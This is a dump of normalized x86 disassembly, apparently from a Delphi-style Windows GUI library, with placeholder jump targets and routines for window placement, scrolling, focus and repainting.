mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_446358
sub_445aa8
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_446590
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_446590
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_445b08
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_4407f4
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_43f6f4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_443cb8
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_445b78
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4418e4
mov edx esi
mov eax ebx
call sub_44311c
pop esi
pop ebx
retn
sub_445b94
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_43ca98
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_457570
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403368
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403368
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403368
test al al
jne r-xdata
sub_445c28
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_447578
mov edx esi
mov eax ebx
call sub_445b94
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_440d98
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_440d98
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_440d98
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_457570
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_440d98
test eax eax
jne r-xdata
jmp r-xdata
sub_445d0c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_440d98
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_445d60
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_440d98
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_457570
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_440d98
test eax eax
jne r-xdata
sub_445dac
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_445b94
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_440d98
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_457570
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_440d98
test eax eax
jne r-xdata
sub_445e08
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_457570
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_440d98
mov [ esi + 0xc ] eax
sub_445e3c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_446754
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_446754
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43f204
mov eax ebx
mov si 0xffd0
call sub_403368
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_43f550
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_445f14
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_4430fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_4430c0
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403368
inc edi
dec ebx
jne r-xdata
sub_445f5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_442c64
xor eax eax
push ebp
push sub_445ffa
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445f14
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f7cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446001
mov eax [ ebp - 0x4 ]
call sub_442c6c
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call sub_4063e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call sub_4063e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_446008
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_4430fc
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_442c8c
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_4430c0
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_4460f8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_417ef0
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_417d84
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_417f10
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_417e94
call sub_446450
jmp r-xdata
mov eax ebp
mov edx esi
call sub_417e94
call sub_446450
sub_4461d0
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_4460f8
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_446230
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_446450
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_446450
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
test eax eax
jne r-xdata
sub_446294
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_446754
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_440d98
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_432b54
call sub_432c34
test al al
je r-xdata
mov eax ebx
call sub_4430fc
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4430c0
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_4430c0
test [ eax + 0x52 ] 0x4
je r-xdata
sub_446358
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_43f550
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_446390
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_457570
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_4463d0
push ebx
mov ebx eax
mov eax ebx
call sub_457570
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_45b3d4
pop ebx
retn
mov eax ebx
call sub_457598
mov eax ebx
call sub_446450
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_446408
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44642c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_44642c
sub_446464
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_416a60
mov eax edi
call sub_4430fc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_4430c0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_4464f8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_446450
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_446530
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_446754
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_446450
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403368
sub_4465ec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_417ef0
pop esi
pop ebx
retn
sub_446610
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_4465ec
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_417d84
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_417f10
sub_446684
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_446754
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_440d98
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_4466e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_446748
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44674f
lea eax [ ebp - 0x4 ]
call sub_4058d0
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403368
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4058e8
sub_446760
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43f204
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_446818
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_417e94
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_417d38
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403368
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_446878
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44696e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403368
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446975
mov eax [ ebp - 0x14 ]
call sub_40316c
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_417ef0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_417e94
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403368
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_446984
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_446878
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_4469b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4430fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4430c0
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_4469f8
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4460f8
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43fe20
sub_446a40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_446ac4
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_446754
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_4430fc
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_446e86
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_4430fc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_446a40
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
